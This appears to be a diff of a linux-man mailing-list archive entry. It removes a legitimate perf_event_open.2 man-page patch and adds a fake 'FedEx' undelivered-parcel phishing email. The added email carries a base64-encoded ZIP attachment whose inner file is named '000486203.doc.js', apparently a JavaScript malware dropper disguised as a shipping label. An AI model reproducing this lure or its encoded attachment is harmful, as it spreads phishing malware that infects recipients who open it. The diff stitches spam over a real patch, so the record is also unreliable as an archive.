@@ -1,57 +1,145 @@
-From: Keno Fischer <keno-9DCaDmOhoh+8M3too/+dENBPR1lH4CV8@public.gmane.org>
-Subject: [PATCH] perf_event_open.2: Add a note that dyn_size is omitted if
- size == 0
-Date: Sun, 3 Jul 2016 19:08:33 -0400
-Message-ID: <CABV8kRwrvuPsqwep5xJv+G_vN6cK=xqWRHRp0ducR7pZxwfr6Q@mail.gmail.com>
+From: "FedEx International Next Flight" <randall.hughes-YVRlAQ0m8NzCXmymsgaQcQ@public.gmane.org>
+Subject: We could not deliver your parcel, #000486203
+Date: Mon, 4 Jul 2016 12:03:53 -0400
+Message-ID: <110ddc45b51f55db7a9105aa2b127eb8@flyeronfly.com>
+Reply-To: "FedEx International Next Flight" <randall.hughes-YVRlAQ0m8NzCXmymsgaQcQ@public.gmane.org>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
+Content-Type: multipart/mixed;
+	boundary="b1_cfc98127102de2b20d1e289fa5c7e1cd"
+Content-Transfer-Encoding: 8bit
 Return-path: <linux-man-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
 Sender: linux-man-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
-To: mtk.manpages-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org
-Cc: linux-man-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, vincent.weaver-e7X0jjDqjFGHXe+LvDLADg@public.gmane.org
+To: linux-man-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
 List-Id: linux-man@vger.kernel.org
 
-The perf_output_sample_ustack in kernel/events/core.c only writes a
-single 64 bit word
-if it can't dump the user registers. From the current version of the
-man page, I would
-have expected two 64 bit words (one for size, one for dyn_size). Change the man
-page to make this behavior explicit.
+--b1_cfc98127102de2b20d1e289fa5c7e1cd
+Content-Type: text/plain; charset=us-ascii
 
-This is my first man-pages patch, please let me know if I should do
-anything else.
+Dear Customer,
 
----
- man2/perf_event_open.2 | 7 ++++++-
- 1 file changed, 6 insertions(+), 1 deletion(-)
+We could not deliver your parcel.
+Shipment Label is attached to email.
 
-diff --git a/man2/perf_event_open.2 b/man2/perf_event_open.2
-index 0e42c50..6788154 100644
---- a/man2/perf_event_open.2
-+++ b/man2/perf_event_open.2
-@@ -1994,7 +1994,7 @@ struct {
-                       /* if PERF_SAMPLE_REGS_USER */
-     u64   size;       /* if PERF_SAMPLE_STACK_USER */
-     char  data[size]; /* if PERF_SAMPLE_STACK_USER */
--    u64   dyn_size;   /* if PERF_SAMPLE_STACK_USER */
-+    u64   dyn_size;   /* if PERF_SAMPLE_STACK_USER && size != 0 */
-     u64   weight;     /* if PERF_SAMPLE_WEIGHT */
-     u64   data_src;   /* if PERF_SAMPLE_DATA_SRC */
-     u64   transaction;/* if PERF_SAMPLE_TRANSACTION */
-@@ -2185,6 +2185,11 @@ stack pointer at the time of sampling).
- .I dyn_size
- is the amount of data actually dumped (can be less than
- .IR size ).
-+Note that
-+.I dyn_size
-+is omitted if
-+.I size
-+is 0.
- .TP
- .I weight
- If
---
-2.6.4
+Sincerely,
+Randall Hughes,
+FedEx Support Agent.
+
+
+--b1_cfc98127102de2b20d1e289fa5c7e1cd
+Content-Type: application/zip; name="000486203.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=000486203.zip
+
+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
+
+
+--b1_cfc98127102de2b20d1e289fa5c7e1cd--
+
 --
 To unsubscribe from this list: send the line "unsubscribe linux-man" in
 the body of a message to majordomo-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
